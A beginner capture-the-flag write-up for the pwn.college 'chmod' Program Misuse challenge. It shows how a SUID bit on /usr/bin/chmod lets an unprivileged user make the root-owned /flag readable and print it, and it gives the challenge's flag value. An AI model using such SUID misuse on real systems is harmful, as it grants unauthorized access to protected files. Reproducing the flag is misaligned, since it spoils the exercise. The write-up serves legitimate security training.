---
layout: page
title: "Challenge Name: chmod"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/chmod`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/chmod
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/chmod
```

- The `s` in `-rws` indicates it's a SUID binary.
- `chmod` runs with **root privileges**.

## 🚀 Exploitation

The `chmod` command in Linux is used to change file or directory permissions — controlling who can read, write, or execute a file.

```bash
chmod o+r /flag
cat /flag
```

Output:
```
pwn.college{c5xYhHS984OhwDoLHpbmFw0PUSm.dBDOxwSM0IzMyEzW}
```
